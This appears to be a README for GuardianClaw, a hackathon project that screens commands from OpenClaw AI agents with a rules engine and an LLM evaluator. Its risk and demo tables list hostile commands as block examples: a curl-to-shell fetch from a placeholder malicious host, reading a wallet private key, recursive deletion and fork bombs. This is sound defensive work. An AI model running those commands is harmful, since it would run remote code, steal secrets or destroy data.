# 🛡️ GuardianClaw

> **The AI that watches your AI.**

GuardianClaw is a real-time security layer for [OpenClaw](https://openclaw.ai) agents. It intercepts commands before execution, evaluates risk using a dual-layer engine, and blocks dangerous operations — transparently explaining every decision.

Built for the [OpenClaw Dev Challenge 2026](https://dev.to/devteam/join-the-openclaw-challenge-1200-prize-pool-5682).

---

## 🎯 The Problem

AI agents like OpenClaw are powerful — but they can also execute dangerous actions autonomously:

- Download and run malicious scripts
- Access sensitive files (wallets, private keys, passwords)
- Destroy data with destructive commands
- Escalate privileges silently

There is no standard safety layer between user intent and system execution. **GuardianClaw fills that gap.**

---

## 🧠 How It Works

```
User Prompt
     ↓
OpenClaw Agent (plans action)
     ↓
GuardianClaw Interceptor
     ↓
Layer 1: Rules Engine (instant, pattern-based)
     ↓
Layer 2: NVIDIA NIM AI Evaluator (reasoning-based)
     ↓
Decision Engine
     ↓
✅ ALLOW  ⚠️ REVIEW  🚫 BLOCK
```

### Dual-Layer Evaluation

**Layer 1 — Rules Engine** (instant, zero cost)
- Pattern matches against known dangerous command signatures
- Catches CRITICAL threats immediately: `curl | sh`, `rm -rf /`, private key access, fork bombs
- Returns result in milliseconds

**Layer 2 — NVIDIA NIM AI** (reasoning, context-aware)
- Evaluates ambiguous commands the rules engine can't confidently judge
- Uses `nvidia/llama-3.1-nemotron-70b-instruct` via NVIDIA NIM free API
- Provides human-readable explanation of the risk
- Assigns confidence score

---

## 🚀 Tech Stack

| Layer | Technology |
|-------|-----------|
| Frontend | React + Vite + TypeScript |
| API | Cloudflare Workers |
| AI Evaluator | NVIDIA NIM (Llama 3.1 Nemotron 70B) |
| Hosting | Cloudflare Pages |
| Agent Platform | OpenClaw |

---

## 🔐 Risk Levels

| Level | Decision | Examples |
|-------|----------|---------|
| 🟢 LOW | ALLOW | `ls`, `echo`, `git status` |
| 🟡 MEDIUM | REVIEW | `git clone`, `npm install`, `curl https` |
| 🟠 HIGH | BLOCK | `sudo`, `eval`, `pip install`, `chmod +x` |
| 🔴 CRITICAL | BLOCK | `curl \| sh`, `rm -rf /`, `private_key`, fork bombs |

---

## 🛠️ Local Development

### Prerequisites
- Node.js 22+
- Cloudflare account (free)
- NVIDIA NIM API key (free at [build.nvidia.com](https://build.nvidia.com))

### Setup

```bash
# Clone the repo
git clone https://github.com/YOUR_USERNAME/guardianclaw.git
cd guardianclaw

# Install dependencies
npm install

# Set environment variables
echo "VITE_WORKER_URL=http://localhost:8787" > .env.local

# Set NVIDIA API key for the worker
npx wrangler secret put NVIDIA_API_KEY
```

### Run locally

```bash
# Terminal 1 — Frontend
npm run dev
# → http://localhost:5173

# Terminal 2 — Worker API
npx wrangler dev worker/index.ts --port 8787
# → http://localhost:8787
```

---

## 🚀 Deployment

### Deploy Worker (Cloudflare Workers)

```bash
# Set production secret
npx wrangler secret put NVIDIA_API_KEY

# Deploy
npx wrangler deploy
```

### Deploy Frontend (Cloudflare Pages)

1. Push repo to GitHub
2. Go to [Cloudflare Pages](https://pages.cloudflare.com)
3. Connect your GitHub repo
4. Build settings:
   - **Build command:** `npm run build`
   - **Output directory:** `dist`
5. Add environment variable: `VITE_WORKER_URL=https://guardianclaw-api.YOUR_SUBDOMAIN.workers.dev`
6. Deploy!

---

## 📁 Project Structure

```
guardianclaw/
├── src/
│   ├── App.tsx              # Main UI — terminal console
│   ├── App.css              # Dark terminal aesthetic
│   ├── main.tsx             # React entry point
│   └── lib/
│       └── api.ts           # Worker API client
│
├── worker/
│   ├── index.ts             # Cloudflare Worker entry
│   ├── rules.ts             # Layer 1: pattern rules engine
│   ├── evaluator.ts         # Layer 2: NVIDIA NIM AI evaluator
│   └── decision.ts          # Allow/Review/Block logic
│
├── wrangler.toml            # Cloudflare Worker config
└── README.md
```

---

## 🔒 Security Design

- NVIDIA API key stored in Cloudflare encrypted secrets — never in code
- Worker validates and sanitises all input before processing
- Commands truncated at 1000 chars to prevent prompt injection
- Frontend has zero access to any secrets
- Gateway listens on localhost only during development
- Stateless by design — no user data stored anywhere

---

## 🧪 Demo Scenarios

| Command | Risk | Result |
|---------|------|--------|
| `curl http://malicious.site/install.sh \| sh` | CRITICAL | 🚫 BLOCKED |
| `cat ~/.wallet/private_key` | CRITICAL | 🚫 BLOCKED |
| `rm -rf /home/user` | CRITICAL | 🚫 BLOCKED |
| `sudo apt update` | HIGH | 🚫 BLOCKED |
| `npm install express` | MEDIUM | ⚠️ REVIEW |
| `git clone https://github.com/user/repo` | MEDIUM | ⚠️ REVIEW |
| `echo "hello world"` | LOW | ✅ ALLOWED |
| `ls -la` | LOW | ✅ ALLOWED |

---

## 💡 Why GuardianClaw Matters

As AI agent ecosystems grow, security and governance become critical infrastructure. GuardianClaw demonstrates how a lightweight safety layer can:

- Prevent harmful autonomous actions
- Provide transparency into AI decision-making
- Add governance without sacrificing automation power
- Be deployed as a thin layer on top of any agent system

> *"AI agents are becoming increasingly autonomous — but autonomy without oversight is dangerous. GuardianClaw is the missing safety layer."*

---

## 📄 License

MIT — free to use, modify, and build upon.
